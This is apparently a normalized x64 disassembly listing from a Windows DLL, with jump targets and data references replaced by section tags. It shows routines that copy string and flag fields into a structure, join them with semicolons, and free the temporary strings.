lea rdx [ rbp + 0x178 ]
lea rcx [ rsp + 0x60 ]
call sub_180006040
mov rdx rax
mov rcx [ rsp + 0x40 ]
call sub_180001b10
movzx ebx al
lea rcx [ rbp - 0x8 ]
call sub_180004400
lea r11 [ r--data ]
mov [ rbp - 0x8 ] r11
lea rcx [ rbp - 0x8 ]
call sub_180017208
movzx eax bl
mov rcx [ rbp + 0x1a0 ]
xor rcx rsp
call sub_180018450
mov rbx [ rsp + 0x2f8 ]
add rsp 0x2b0
pop r15
pop r14
pop r13
pop r12
pop rdi
pop rsi
pop rbp
retn
test bl bl
je r-xdata
mov rax [ rsp + 0x70 ]
movsxd rcx [ rax + 0x4 ]
or [ rbp + rcx - 0x78 ] 0x4000
lea rdx [ r--data ]
lea rcx [ rsp + 0x70 ]
call sub_180008ab0
mov rcx rax
call sub_180009790
lea rdx [ r--data ]
mov rcx rax
call sub_180008ab0
mov rcx rax
call sub_180009790
lea rdx [ r--data ]
mov rcx rax
call sub_180008ab0
mov rcx rax
mov edx [ rdi ]
call sub_180005d90
mov rcx rax
call sub_180009790
lea rdx [ r--data ]
mov rcx rax
call sub_180008ab0
mov rcx rax
lea rdx [ rdi + 0x8 ]
call sub_18000def0
mov rcx rax
call sub_180009790
lea rdx [ r--data ]
mov rcx rax
call sub_180008ab0
mov rcx rax
lea rdx [ rdi + 0x30 ]
call sub_18000def0
mov rcx rax
call sub_180009790
lea rdx [ r--data ]
mov rcx rax
call sub_180008ab0
mov rcx rax
lea rdx [ rdi + 0x58 ]
call sub_18000def0
mov rcx rax
call sub_180009790
lea rdx [ r--data ]
mov rcx rax
call sub_180008ab0
mov rcx rax
movzx edx [ rdi + 0x80 ]
call sub_18000d3b0
mov rcx rax
call sub_180009790
lea rdx [ r--data ]
mov rcx rax
call sub_180008ab0
mov rcx rax
movzx edx [ rdi + 0x81 ]
call sub_18000d3b0
mov rcx rax
call sub_180009790
lea rdx [ r--data ]
mov rcx rax
call sub_180008ab0
mov rcx rax
lea rdx [ rdi + 0x88 ]
call sub_18000def0
mov rcx rax
call sub_180009790
lea rdx [ r--data ]
mov rcx rax
call sub_180008ab0
mov rcx rax
lea rdx [ rdi + 0xb0 ]
call sub_18000def0
mov rcx rax
call sub_180009790
lea rdx [ r--data ]
mov rcx rax
call sub_180008ab0
mov rcx rax
lea rdx [ rdi + 0xd8 ]
call sub_18000def0
mov rcx rax
call sub_180009790
lea rdx [ r--data ]
mov rcx rax
call sub_180008ab0
mov rcx rax
lea rdx [ rdi + 0x100 ]
call sub_18000def0
mov rcx rax
call sub_180009790
lea rdx [ r--data ]
mov rcx rax
call sub_180008ab0
mov rcx rax
lea rdx [ rdi + 0x150 ]
call sub_18000def0
mov rcx rax
call sub_180009790
mov rcx rax
call sub_180009790
lea rdx [ r--data ]
mov rcx rax
call sub_180008ab0
mov rcx rax
call sub_180009790
lea rdx [ r--data ]
mov rcx rax
call sub_180008ab0
mov rcx rax
call sub_180009790
lea rdx [ r--data ]
mov rcx rax
call sub_180008ab0
mov rcx rax
lea rdx [ rdi + 0x178 ]
call sub_18000def0
mov rcx rax
call sub_180009790
lea rdx [ r--data ]
mov rcx rax
call sub_180008ab0
mov rcx rax
lea rdx [ rdi + 0x1a0 ]
call sub_18000def0
mov rcx rax
call sub_180009790
lea rdx [ r--data ]
mov rcx rax
call sub_180008ab0
mov rcx rax
lea rdx [ rdi + 0x1c8 ]
call sub_18000def0
mov rcx rax
call sub_180009790
lea rdx [ r--data ]
mov rcx rax
call sub_180008ab0
mov rcx rax
lea rdx [ rdi + 0x1f0 ]
call sub_18000def0
mov rcx rax
call sub_180009790
mov rcx rax
call sub_180009790
lea rdx [ r--data ]
mov rcx rax
call sub_180008ab0
mov rcx rax
call sub_180009790
lea rdx [ r--data ]
mov rcx rax
call sub_180008ab0
mov rcx rax
call sub_180009790
lea rdx [ r--data ]
mov rcx rax
call sub_180008ab0
mov rcx rax
movzx edx [ rdi + 0x218 ]
call sub_18000d590
mov rcx rax
call sub_180009790
lea rdx [ r--data ]
mov rcx rax
call sub_180008ab0
mov rcx rax
movzx edx [ rdi + 0x21a ]
call sub_18000d590
mov rcx rax
call sub_180009790
lea rdx [ r--data ]
mov rcx rax
call sub_180008ab0
mov rcx rax
lea rdx [ rdi + 0x220 ]
call sub_18000def0
mov rcx rax
call sub_180009790
lea rdx [ r--data ]
mov rcx rax
call sub_180008ab0
mov rcx rax
lea rdx [ rdi + 0x270 ]
call sub_18000def0
mov rcx rax
call sub_180009790
mov rcx rax
call sub_180009790
lea rdx [ r--data ]
mov rcx rax
call sub_180008ab0
mov rcx rax
call sub_180009790
lea rdx [ r--data ]
mov rcx rax
call sub_180008ab0
mov rcx rax
call sub_180009790
lea rdx [ r--data ]
mov rcx rax
call sub_180008ab0
mov rcx rax
lea rdx [ rdi + 0x2c0 ]
call sub_18000def0
mov rcx rax
call sub_180009790
lea rdx [ r--data ]
mov rcx rax
call sub_180008ab0
mov rcx rax
movzx edx [ rdi + 0x310 ]
call sub_18000d3b0
mov rcx rax
call sub_180009790
lea rdx [ r--data ]
mov rcx rax
call sub_180008ab0
mov rcx rax
movzx edx [ rdi + 0x311 ]
call sub_18000d3b0
mov rcx rax
call sub_180009790
lea rdx [ r--data ]
mov rcx rax
call sub_180008ab0
mov rcx rax
movzx edx [ rdi + 0x312 ]
call sub_18000d3b0
mov rcx rax
call sub_180009790
lea rdx [ r--data ]
mov rcx rax
call sub_180008ab0
mov rcx rax
lea rdx [ rdi + 0x318 ]
call sub_18000def0
mov rcx rax
call sub_180009790
lea rdx [ r--data ]
mov rcx rax
call sub_180008ab0
mov rcx rax
lea rdx [ rdi + 0x368 ]
call sub_18000def0
mov rcx rax
call sub_180009790
mov rcx rax
call sub_180009790
lea rdx [ r--data ]
mov rcx rax
call sub_180008ab0
mov rcx rax
call sub_180009790
lea rdx [ r--data ]
mov rcx rax
call sub_180008ab0
mov rcx rax
call sub_180009790
lea rdx [ r--data ]
mov rcx rax
call sub_180008ab0
mov rcx rax
lea rdx [ rdi + 0x3c0 ]
call sub_18000def0
mov rcx rax
call sub_180009790
lea rdx [ r--data ]
mov rcx rax
call sub_180008ab0
mov rcx rax
lea rdx [ rdi + 0x3f0 ]
call sub_18000def0
mov rcx rax
call sub_180009790
jmp r-xdata
lea rdx [ rdi + 0x1f0 ]
lea rcx [ rbp + 0x178 ]
call sub_18000d250
mov [ rsp + 0x30 ] rax
lea rdx [ rdi + 0x1c8 ]
lea rcx [ rbp + 0xd8 ]
call sub_18000d250
mov [ rsp + 0x28 ] rax
lea rdx [ rdi + 0x1a0 ]
lea rcx [ rbp + 0x88 ]
call sub_18000d250
mov [ rsp + 0x48 ] rax
lea rdx [ rdi + 0x178 ]
lea rcx [ rbp + 0x100 ]
call sub_18000d250
mov [ rsp + 0x38 ] rax
lea rdx [ rdi + 0x150 ]
lea rcx [ rbp + 0x150 ]
call sub_18000d250
mov [ rsp + 0x50 ] rax
lea rdx [ rdi + 0xd8 ]
lea rcx [ rbp + 0xb0 ]
call sub_18000d250
mov r15 rax
lea rdx [ rdi + 0xb0 ]
lea rcx [ rbp + 0x128 ]
call sub_18000d250
mov r14 rax
lea rdx [ rdi + 0x58 ]
lea rcx [ rbp + 0x60 ]
call sub_18000d250
mov r12 rax
lea r13 [ rdi + 0x128 ]
lea rsi [ rdi + 0x88 ]
mov rax rdi
lea rbx [ rax + 0x8 ]
mov edx [ rax ]
lea rcx [ rsp + 0x70 ]
call sub_180005d90
mov rcx rax
mov edx 0x3b
call sub_180008d10
mov rcx rax
mov rdx rbx
call sub_18000def0
mov rcx rax
mov edx 0x3b
call sub_180008d10
mov rcx rax
lea rdx [ rdi + 0x30 ]
call sub_18000def0
mov rcx rax
mov edi 0x3b
movzx edx di
call sub_180008d10
mov rcx rax
mov rdx r12
call sub_18000def0
mov rcx rax
movzx edx di
call sub_180008d10
mov rcx rax
mov rbx [ rsp + 0x20 ]
movzx edx [ rbx + 0x80 ]
call sub_18000d3b0
mov rcx rax
movzx edx di
call sub_180008d10
mov rcx rax
movzx edx [ rbx + 0x81 ]
call sub_18000d3b0
mov rcx rax
movzx edx di
call sub_180008d10
mov rcx rax
mov rdx rsi
call sub_18000def0
mov rcx rax
movzx edx di
call sub_180008d10
mov rcx rax
mov rdx r14
call sub_18000def0
mov rcx rax
movzx edx di
call sub_180008d10
mov rcx rax
mov rdx r15
call sub_18000def0
mov rcx rax
movzx edx di
call sub_180008d10
mov rcx rax
mov rdx r13
call sub_18000def0
mov rcx rax
movzx edx di
call sub_180008d10
mov rcx rax
mov rdx [ rsp + 0x50 ]
call sub_18000def0
mov rcx rax
movzx edx di
call sub_180008d10
mov rcx rax
mov rdx [ rsp + 0x38 ]
call sub_18000def0
mov rcx rax
movzx edx di
call sub_180008d10
mov rcx rax
mov rdx [ rsp + 0x48 ]
call sub_18000def0
mov rcx rax
movzx edx di
call sub_180008d10
mov rcx rax
mov rdx [ rsp + 0x28 ]
call sub_18000def0
mov rcx rax
movzx edx di
call sub_180008d10
mov rcx rax
mov rdx [ rsp + 0x30 ]
call sub_18000def0
mov rcx rax
movzx edx di
call sub_180008d10
mov rcx rax
movzx edx [ rbx + 0x218 ]
call sub_18000d590
mov rcx rax
movzx edx di
call sub_180008d10
mov rcx rax
movzx edx [ rbx + 0x21a ]
call sub_18000d590
mov rcx rax
movzx edx di
call sub_180008d10
mov rcx rax
lea rdx [ rbx + 0x248 ]
call sub_18000def0
mov rcx rax
movzx edx di
call sub_180008d10
mov rcx rax
lea rdx [ rbx + 0x298 ]
call sub_18000def0
mov rcx rax
movzx edx di
call sub_180008d10
mov rcx rax
lea rdx [ rbx + 0x2e8 ]
call sub_18000def0
mov rcx rax
movzx edx di
call sub_180008d10
mov rcx rax
movzx edx [ rbx + 0x310 ]
call sub_18000d3b0
mov rcx rax
movzx edx di
call sub_180008d10
mov rcx rax
movzx edx [ rbx + 0x311 ]
call sub_18000d3b0
mov rcx rax
movzx edx di
call sub_180008d10
mov rcx rax
movzx edx [ rbx + 0x312 ]
call sub_18000d3b0
mov rcx rax
movzx edx di
call sub_180008d10
mov rcx rax
lea rdx [ rbx + 0x340 ]
call sub_18000def0
mov rcx rax
movzx edx di
call sub_180008d10
mov rcx rax
lea rdx [ rbx + 0x390 ]
call sub_18000def0
mov rcx rax
movzx edx di
call sub_180008d10
mov rcx rax
lea rdx [ rbx + 0x3c0 ]
call sub_18000def0
mov rcx rax
movzx edx di
call sub_180008d10
mov rcx rax
lea rdx [ rbx + 0x3f0 ]
call sub_18000def0
mov rcx rax
movzx edx di
call sub_180008d10
nop
cmp [ rbp + 0x78 ] 0x8
jb r-xdata
mov rcx rax
call sub_180009790
mov [ rbp + 0x78 ] 0x7
xor ebx ebx
mov [ rbp + 0x70 ] rbx
mov [ rbp + 0x60 ] bx
cmp [ rbp + 0x140 ] 0x8
jb r-xdata
mov rcx [ rbp + 0x60 ]
call j_sub_180018b3c
mov [ rbp + 0x140 ] 0x7
mov [ rbp + 0x138 ] rbx
mov [ rbp + 0x128 ] bx
cmp [ rbp + 0xc8 ] 0x8
jb r-xdata
mov rcx [ rbp + 0x128 ]
call j_sub_180018b3c
mov [ rbp + 0xc8 ] 0x7
mov [ rbp + 0xc0 ] rbx
mov [ rbp + 0xb0 ] bx
cmp [ rbp + 0x168 ] 0x8
jb r-xdata
mov rcx [ rbp + 0xb0 ]
call j_sub_180018b3c
mov [ rbp + 0x168 ] 0x7
mov [ rbp + 0x160 ] rbx
mov [ rbp + 0x150 ] bx
cmp [ rbp + 0x118 ] 0x8
jb r-xdata
mov rcx [ rbp + 0x150 ]
call j_sub_180018b3c
mov [ rbp + 0x118 ] 0x7
mov [ rbp + 0x110 ] rbx
mov [ rbp + 0x100 ] bx
cmp [ rbp + 0xa0 ] 0x8
jb r-xdata
mov rcx [ rbp + 0x100 ]
call j_sub_180018b3c
mov [ rbp + 0xa0 ] 0x7
mov [ rbp + 0x98 ] rbx
mov [ rbp + 0x88 ] bx
cmp [ rbp + 0xf0 ] 0x8
jb r-xdata
mov rcx [ rbp + 0x88 ]
call j_sub_180018b3c
mov [ rbp + 0xf0 ] 0x7
mov [ rbp + 0xe8 ] rbx
mov [ rbp + 0xd8 ] bx
cmp [ rbp + 0x190 ] 0x8
jb r-xdata
mov rcx [ rbp + 0xd8 ]
call j_sub_180018b3c
mov rcx [ rbp + 0x178 ]
call j_sub_180018b3c
jmp r-xdata
sub_18000b4d0
push rbp
push rsi
push rdi
push r12
push r13
push r14
push r15
lea rbp [ rsp - 0x2f0 ]
sub rsp 0x3f0
mov [ rbp + 0x28 ] 0xfffffffffffffffe
mov [ rsp + 0x438 ] rbx
mov rax [ rw-data ]
xor rax rsp
mov [ rbp + 0x2e0 ] rax
mov r12 r8
mov ebx edx
mov rdi rcx
mov [ rbp + 0x20 ] rcx
xor r15d r15d
mov [ rsp + 0x20 ] r15d
call sub_18000bfa0
mov esi 0x1
mov [ rsp + 0x20 ] esi
cmp ebx 0x12
je r-xdata
mov rbx [ r12 ]
cmp [ rbx + 0x21 ] 0x0
setne cl
mov [ rdi + 0x3b8 ] cl
cmp [ rbx + 0x20 ] 0x0
setne al
mov [ rdi + 0x3e8 ] al
lea rax [ r--data ]
lea rdx [ r--data ]
lea r14 [ r--data ]
mov r12d 0x10
lea r13d [ r12 + 0x20 ]
test cl cl
je r-xdata
cmp ebx 0x15
jne r-xdata
cmp [ rdi + 0x3e8 ] 0x0
je r-xdata
mov [ rsp + 0x30 ] rax
mov esi 0x3
mov [ rsp + 0x20 ] esi
mov [ rbp - 0x48 ] rdx
lea rcx [ rbp - 0x48 ]
call sub_180003960
lea r11 [ rsp + 0x38 ]
mov [ rbp ] r11
mov [ rbp + 0x8 ] r15
lea rcx [ rbp - 0x48 ]
call sub_180005300
mov [ rbp + 0x10 ] ax
cmp [ rbp ] 0x0
jne r-xdata
mov rax rdi
mov rcx [ rbp + 0x2e0 ]
xor rcx rsp
call sub_180018450
mov rbx [ rsp + 0x438 ]
add rsp 0x3f0
pop r15
pop r14
pop r13
pop r12
pop rdi
pop rsi
pop rbp
retn
mov rsi [ r12 ]
mov eax [ rsi + 0x110 ]
mov [ rdi ] eax
movzx r8d [ rsi + 0x30 ]
shr r8 0x1
lea rcx [ rdi + 0x8 ]
mov rdx [ rsi + 0x38 ]
call sub_1800023b0
movzx r8d [ rsi + 0x40 ]
shr r8 0x1
mov rdx [ rsi + 0x48 ]
lea rcx [ rdi + 0x58 ]
call sub_1800023b0
lea rcx [ rdi + 0x58 ]
call sub_18000d2e0
movzx eax [ rsi + 0x118 ]
not al
and al 0x1
mov [ rdi + 0x80 ] al
mov eax [ rsi + 0x118 ]
shr eax 0xa
and al 0x1
mov [ rdi + 0x81 ] al
mov eax [ rsi + 0x118 ]
bt eax 0x8
jae r-xdata
mov [ rsp + 0x30 ] rax
or esi 0x8
mov [ rsp + 0x20 ] esi
mov [ rbp - 0x48 ] rdx
lea rcx [ rbp - 0x48 ]
call sub_180003960
lea r11 [ rsp + 0x38 ]
mov [ rbp ] r11
mov [ rbp + 0x8 ] r15
lea rcx [ rbp - 0x48 ]
call sub_180005300
mov [ rbp + 0x10 ] ax
cmp [ rbp ] 0x0
jne r-xdata
mov rax [ rsp + 0x30 ]
movsxd rcx [ rax + 0x4 ]
lea rax [ r--data ]
mov [ rsp + rcx + 0x30 ] rax
lea rcx [ rsp + 0x38 ]
call sub_1800050e0
nop
mov [ rsp + 0x38 ] r14
mov [ rbp - 0x58 ] r15
mov [ rbp - 0x50 ] 0x4
lea r13 [ rbx + 0x10 ]
mov r14 r12
mov r15d 0x30
nop [ rax ] eax
mov edx [ rbp - 0x38 ]
or edx 0x4
xor r8d r8d
lea rcx [ rbp - 0x48 ]
call sub_1800037f0
nop
test al al
jns r-xdata
mov r8d ebx
lea rdx [ r--data ]
jmp r-xdata
mov rax [ rsp + 0x30 ]
movsxd rcx [ rax + 0x4 ]
lea rax [ r--data ]
mov [ rsp + rcx + 0x30 ] rax
lea rcx [ rsp + 0x38 ]
call sub_1800050e0
nop
mov [ rsp + 0x38 ] r14
mov [ rbp - 0x58 ] r15
mov [ rbp - 0x50 ] 0x4
nop [ rax + rax ] eax
mov edx [ rbp - 0x38 ]
or edx 0x4
xor r8d r8d
lea rcx [ rbp - 0x48 ]
call sub_1800037f0
nop
mov edx 0x2
lea rcx [ rbp + 0x40 ]
call sub_180017d60
mov rcx [ rsp + 0x30 ]
movsxd rdx [ rcx + 0x4 ]
lea rcx [ rsp + rdx + 0x30 ]
mov rdx [ rax + 0x8 ]
call [ rax ]
mov r11 [ rsp + 0x30 ]
movsxd rax [ r11 + 0x4 ]
mov [ rbp + rax - 0x78 ] r15w
mov rax [ rsp + 0x30 ]
movsxd rcx [ rax + 0x4 ]
and [ rsp + rcx + 0x48 ] 0xfffff9ff
or [ rsp + rcx + 0x48 ] 0x800
movzx edx [ r13 ]
lea rcx [ rsp + 0x30 ]
call sub_18000d770
inc r13
dec r14
jne r-xdata
lea rdx [ rbp + 0x1b8 ]
lea rcx [ rsp + 0x30 ]
call sub_18000ddd0
nop
lea rcx [ rdi + 0x3c0 ]
mov rdx rax
call sub_180001fd0
nop
cmp [ rbp + 0x1d0 ] 0x8
mov r15 r14
jb r-xdata
test al 0x10
je r-xdata
mov r8d 0xa
lea rdx [ r--data ]
jmp r-xdata
lea rcx [ rdi + 0x88 ]
call sub_1800023b0
movzx r8d [ rsi + 0xb0 ]
shr r8 0x1
mov rdx [ rsi + 0xb8 ]
lea rcx [ rdi + 0xb0 ]
call sub_1800023b0
lea rcx [ rdi + 0xb0 ]
call sub_18000d2e0
movzx r8d [ rsi + 0x90 ]
shr r8 0x1
mov rdx [ rsi + 0x98 ]
lea rcx [ rdi + 0xd8 ]
call sub_1800023b0
lea rcx [ rdi + 0xd8 ]
call sub_18000d2e0
xor r8d r8d
lea rdx [ rsi + 0x18 ]
lea rcx [ rbp + 0x1e0 ]
call sub_18000ce80
nop
lea rcx [ rdi + 0x100 ]
mov rdx rax
call sub_180001fd0
nop
cmp [ rbp + 0x1f8 ] 0x8
jb r-xdata
mov edx 0x2
lea rcx [ rbp + 0x30 ]
call sub_180017d60
mov rcx [ rsp + 0x30 ]
movsxd rdx [ rcx + 0x4 ]
lea rcx [ rsp + rdx + 0x30 ]
mov rdx [ rax + 0x8 ]
call [ rax ]
mov r11 [ rsp + 0x30 ]
movsxd rax [ r11 + 0x4 ]
mov [ rbp + rax - 0x78 ] r13w
mov rax [ rsp + 0x30 ]
movsxd rcx [ rax + 0x4 ]
and [ rsp + rcx + 0x48 ] 0xfffff9ff
or [ rsp + rcx + 0x48 ] 0x800
movzx edx [ rbx ]
lea rcx [ rsp + 0x30 ]
call sub_18000d770
inc rbx
dec r12
jne r-xdata
lea rdx [ rbp + 0x208 ]
lea rcx [ rsp + 0x30 ]
call sub_18000ddd0
mov rbx rax
lea rsi [ rdi + 0x3f0 ]
cmp rsi rax
je r-xdata
mov [ rbp + 0x1d0 ] 0x7
mov [ rbp + 0x1c8 ] r15
mov [ rbp + 0x1b8 ] r15w
lea rcx [ rbp - 0x48 ]
call sub_18000dd20
lea r11 [ r--data ]
mov [ rbp - 0x48 ] r11
lea rcx [ rbp - 0x48 ]
call sub_180017208
mov r13d 0x30
lea rax [ r--data ]
lea rdx [ r--data ]
lea r14 [ r--data ]
mov rcx [ rbp + 0x1b8 ]
call j_sub_180018b3c
mov r8d 0x7
lea rdx [ r--data ]
mov r8d 0xb
lea rdx [ r--data ]
jmp r-xdata
mov [ rbp + 0x1f8 ] 0x7
mov [ rbp + 0x1f0 ] r15
mov [ rbp + 0x1e0 ] r15w
mov r8b 0x1
lea rdx [ rsi + 0x18 ]
lea rcx [ rbp + 0x258 ]
call sub_18000ce80
nop
lea rcx [ rdi + 0x128 ]
mov rdx rax
call sub_180001fd0
nop
cmp [ rbp + 0x270 ] 0x8
jb r-xdata
mov rcx [ rbp + 0x1e0 ]
call j_sub_180018b3c
cmp [ rbp + 0x220 ] 0x8
jb r-xdata
cmp [ rsi + 0x18 ] 0x8
jb r-xdata
mov [ rbp + 0x270 ] 0x7
mov [ rbp + 0x268 ] r15
mov [ rbp + 0x258 ] r15w
movzx r8d [ rsi + 0xa0 ]
shr r8 0x1
lea rcx [ rdi + 0x150 ]
mov rdx [ rsi + 0xa8 ]
call sub_1800023b0
movzx r8d [ rsi + 0x50 ]
shr r8 0x1
mov rdx [ rsi + 0x58 ]
lea rcx [ rdi + 0x178 ]
call sub_1800023b0
lea rcx [ rdi + 0x178 ]
call sub_18000d2e0
movzx r8d [ rsi + 0x60 ]
shr r8 0x1
mov rdx [ rsi + 0x68 ]
lea rcx [ rdi + 0x1a0 ]
call sub_1800023b0
lea rcx [ rdi + 0x1a0 ]
call sub_18000d2e0
movzx r8d [ rsi + 0x80 ]
shr r8 0x1
mov rdx [ rsi + 0x88 ]
lea rcx [ rdi + 0x1c8 ]
call sub_1800023b0
lea rcx [ rdi + 0x1c8 ]
call sub_18000d2e0
movzx r8d [ rsi + 0x70 ]
shr r8 0x1
mov rdx [ rsi + 0x78 ]
lea rcx [ rdi + 0x1f0 ]
call sub_1800023b0
lea rcx [ rdi + 0x1f0 ]
call sub_18000d2e0
movzx r11d [ rsi + 0x132 ]
mov [ rdi + 0x218 ] r11w
movzx eax [ rsi + 0x130 ]
mov [ rdi + 0x21a ] ax
xor r8d r8d
mov rdx rsi
lea rcx [ rbp + 0xa0 ]
call sub_18000ce80
nop
lea rcx [ rdi + 0x220 ]
mov rdx rax
call sub_180001fd0
nop
cmp [ rbp + 0xb8 ] 0x8
jb r-xdata
mov rcx [ rbp + 0x258 ]
call j_sub_180018b3c
mov [ rbp + 0x220 ] 0x7
mov [ rbp + 0x218 ] r15
mov [ rbp + 0x208 ] r15w
lea rcx [ rbp - 0x48 ]
call sub_18000dd20
lea rax [ r--data ]
mov [ rbp - 0x48 ] rax
lea rcx [ rbp - 0x48 ]
call sub_180017208
mov rcx [ rbp + 0x208 ]
call j_sub_180018b3c
mov [ rsi + 0x18 ] 0x7
mov [ rsi + 0x10 ] r15
mov [ rsi ] r15w
cmp [ rbx + 0x18 ] 0x8
jae r-xdata
mov rcx [ rsi ]
call j_sub_180018b3c
mov [ rbp + 0xb8 ] 0x7
mov [ rbp + 0xb0 ] r15
mov [ rbp + 0xa0 ] r15w
mov r8b 0x1
mov rdx rsi
lea rcx [ rbp + 0x230 ]
call sub_18000ce80
nop
lea rcx [ rdi + 0x248 ]
mov rdx rax
call sub_180001fd0
nop
cmp [ rbp + 0x248 ] 0x8
jb r-xdata
mov rcx [ rbp + 0xa0 ]
call j_sub_180018b3c
mov rax [ rbx ]
mov [ rsi ] rax
mov [ rbx ] r15
mov r8 [ rbx + 0x10 ]
inc r8
add r8 r8
mov rdx rbx
mov rcx rsi
call sub_180018670
jmp r-xdata
mov [ rbp + 0x248 ] 0x7
mov [ rbp + 0x240 ] r15
mov [ rbp + 0x230 ] r15w
xor r8d r8d
lea rdx [ rsi + 0x8 ]
lea rcx [ rbp + 0xf0 ]
call sub_18000ce80
nop
lea rcx [ rdi + 0x270 ]
mov rdx rax
call sub_180001fd0
nop
cmp [ rbp + 0x108 ] 0x8
jb r-xdata
mov rcx [ rbp + 0x230 ]
call j_sub_180018b3c
mov rax [ rbx + 0x10 ]
mov [ rsi + 0x10 ] rax
mov rax [ rbx + 0x18 ]
mov [ rsi + 0x18 ] rax
mov [ rbx + 0x18 ] 0x7
mov [ rbx + 0x10 ] r15
mov [ rbx ] r15w
mov [ rbp + 0x108 ] 0x7
mov [ rbp + 0x100 ] r15
mov [ rbp + 0xf0 ] r15w
mov r8b 0x1
lea rdx [ rsi + 0x8 ]
lea rcx [ rbp + 0x50 ]
call sub_18000ce80
nop
lea rcx [ rdi + 0x298 ]
mov rdx rax
call sub_180001fd0
nop
cmp [ rbp + 0x68 ] 0x8
jb r-xdata
mov rcx [ rbp + 0xf0 ]
call j_sub_180018b3c
mov [ rbp + 0x68 ] 0x7
mov [ rbp + 0x60 ] r15
mov [ rbp + 0x50 ] r15w
xor r8d r8d
lea rdx [ rsi + 0x10 ]
lea rcx [ rbp + 0x140 ]
call sub_18000ce80
nop
lea rcx [ rdi + 0x2c0 ]
mov rdx rax
call sub_180001fd0
nop
cmp [ rbp + 0x158 ] 0x8
jb r-xdata
mov rcx [ rbp + 0x50 ]
call j_sub_180018b3c
mov [ rbp + 0x158 ] 0x7
mov [ rbp + 0x150 ] r15
mov [ rbp + 0x140 ] r15w
mov r8b 0x1
lea rdx [ rsi + 0x10 ]
lea rcx [ rbp + 0x280 ]
call sub_18000ce80
nop
lea rcx [ rdi + 0x2e8 ]
mov rdx rax
call sub_180001fd0
nop
cmp [ rbp + 0x298 ] 0x8
jb r-xdata
mov rcx [ rbp + 0x140 ]
call j_sub_180018b3c
mov [ rbp + 0x298 ] 0x7
mov [ rbp + 0x290 ] r15
mov [ rbp + 0x280 ] r15w
mov eax [ rsi + 0x118 ]
shr eax 0x9
and al 0x1
mov [ rdi + 0x310 ] al
mov eax [ rsi + 0x118 ]
shr eax 0x2
and al 0x1
mov [ rdi + 0x311 ] al
cmp [ rsi + 0x13a ] 0x0
setne al
mov [ rdi + 0x312 ] al
xor r8d r8d
lea rdx [ rsi + 0x20 ]
lea rcx [ rbp + 0x190 ]
call sub_18000ce80
nop
lea rcx [ rdi + 0x318 ]
mov rdx rax
call sub_180001fd0
nop
cmp [ rbp + 0x1a8 ] 0x8
jb r-xdata
mov rcx [ rbp + 0x280 ]
call j_sub_180018b3c
mov [ rbp + 0x1a8 ] 0x7
mov [ rbp + 0x1a0 ] r15
mov [ rbp + 0x190 ] r15w
mov r8b 0x1
lea rdx [ rsi + 0x20 ]
lea rcx [ rbp + 0x78 ]
call sub_18000ce80
nop
lea rcx [ rdi + 0x340 ]
mov rdx rax
call sub_180001fd0
nop
cmp [ rbp + 0x90 ] 0x8
jb r-xdata
mov rcx [ rbp + 0x190 ]
call j_sub_180018b3c
mov [ rbp + 0x90 ] 0x7
mov [ rbp + 0x88 ] r15
mov [ rbp + 0x78 ] r15w
xor r8d r8d
lea rdx [ rsi + 0x28 ]
lea rcx [ rbp + 0xc8 ]
call sub_18000ce80
nop
lea rcx [ rdi + 0x368 ]
mov rdx rax
call sub_180001fd0
nop
cmp [ rbp + 0xe0 ] 0x8
jb r-xdata
mov rcx [ rbp + 0x78 ]
call j_sub_180018b3c
mov [ rbp + 0xe0 ] 0x7
mov [ rbp + 0xd8 ] r15
mov [ rbp + 0xc8 ] r15w
mov r8b 0x1
lea rdx [ rsi + 0x28 ]
lea rcx [ rbp + 0x118 ]
call sub_18000ce80
nop
lea rcx [ rdi + 0x390 ]
mov rdx rax
call sub_180001fd0
nop
cmp [ rbp + 0x130 ] 0x8
jb r-xdata
mov rcx [ rbp + 0xc8 ]
call j_sub_180018b3c
mov [ rbp + 0x130 ] 0x7
mov [ rbp + 0x128 ] r15
mov [ rbp + 0x118 ] r15w
cmp [ rsi + 0x138 ] 0x0
setne cl
mov [ rdi + 0x3b8 ] cl
cmp [ rsi + 0x139 ] 0x0
setne al
mov [ rdi + 0x3e8 ] al
test cl cl
je r-xdata
mov rcx [ rbp + 0x118 ]
call j_sub_180018b3c
cmp [ rdi + 0x3e8 ] 0x0
je r-xdata
lea rdx [ rsi + 0xd0 ]
lea rcx [ rbp + 0x168 ]
call sub_18000cce0
nop
lea rcx [ rdi + 0x3c0 ]
mov rdx rax
call sub_180001fd0
nop
cmp [ rbp + 0x180 ] 0x8
jb r-xdata
lea rdx [ rsi + 0xe0 ]
lea rcx [ rbp + 0x2a8 ]
call sub_18000cce0
nop
lea rcx [ rdi + 0x3f0 ]
mov rdx rax
call sub_180001fd0
nop
cmp [ rbp + 0x2c0 ] 0x8
jb r-xdata
mov [ rbp + 0x180 ] 0x7
mov [ rbp + 0x178 ] r15
mov [ rbp + 0x168 ] r15w
mov rcx [ rbp + 0x168 ]
call j_sub_180018b3c
mov rcx [ rbp + 0x2a8 ]
call j_sub_180018b3c
jmp r-xdata
sub_18000bfa0
mov [ rcx + 0x20 ] 0x7
xor eax eax
mov [ rcx + 0x18 ] rax
mov [ rcx + 0x8 ] ax
mov [ rcx + 0x40 ] rax
mov [ rcx + 0x48 ] 0x7
mov [ rcx + 0x30 ] ax
mov [ rcx + 0x68 ] rax
mov [ rcx + 0x70 ] 0x7
mov [ rcx + 0x58 ] ax
mov [ rcx + 0x98 ] rax
mov [ rcx + 0xa0 ] 0x7
mov [ rcx + 0x88 ] ax
mov [ rcx + 0xc0 ] rax
mov [ rcx + 0xc8 ] 0x7
mov [ rcx + 0xb0 ] ax
mov [ rcx + 0xe8 ] rax
mov [ rcx + 0xf0 ] 0x7
mov [ rcx + 0xd8 ] ax
mov [ rcx + 0x110 ] rax
mov [ rcx + 0x118 ] 0x7
mov [ rcx + 0x100 ] ax
mov [ rcx + 0x138 ] rax
mov [ rcx + 0x140 ] 0x7
mov [ rcx + 0x128 ] ax
mov [ rcx + 0x160 ] rax
mov [ rcx + 0x168 ] 0x7
mov [ rcx + 0x150 ] ax
mov [ rcx + 0x188 ] rax
mov [ rcx + 0x190 ] 0x7
mov [ rcx + 0x178 ] ax
mov [ rcx + 0x1b0 ] rax
mov [ rcx + 0x1b8 ] 0x7
mov [ rcx + 0x1a0 ] ax
mov [ rcx + 0x1d8 ] rax
mov [ rcx + 0x1e0 ] 0x7
mov [ rcx + 0x1c8 ] ax
mov [ rcx + 0x200 ] rax
mov [ rcx + 0x208 ] 0x7
mov [ rcx + 0x1f0 ] ax
mov [ rcx + 0x230 ] rax
mov [ rcx + 0x238 ] 0x7
mov [ rcx + 0x220 ] ax
